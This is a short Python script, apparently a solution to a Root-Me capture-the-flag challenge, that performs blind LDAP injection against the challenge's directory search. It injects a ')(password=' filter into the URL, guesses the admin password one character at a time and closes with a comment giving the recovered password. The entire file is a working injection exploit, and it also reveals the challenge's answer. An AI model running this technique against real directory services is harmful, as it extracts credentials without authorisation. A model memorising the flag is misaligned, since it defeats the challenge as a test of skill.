import requests
import string,re,time

vocabulaire="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX&#YZ!$%'()*+,-./:;<=>?@[\]^_`{|}~"
password=''
while(True):
    for ele in vocabulaire:
        url="http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=admin@ch26.challenge01.root-me.org)(password="
        test=password+ele
        d=requests.post(url+test)
        if d.text.find("sn : admin")!=-1:
            password+=ele
            print("GREAT...",password)
            break
        else:
            print("waiting.....", password+ele)


# the password is: dsy365gdzerzo94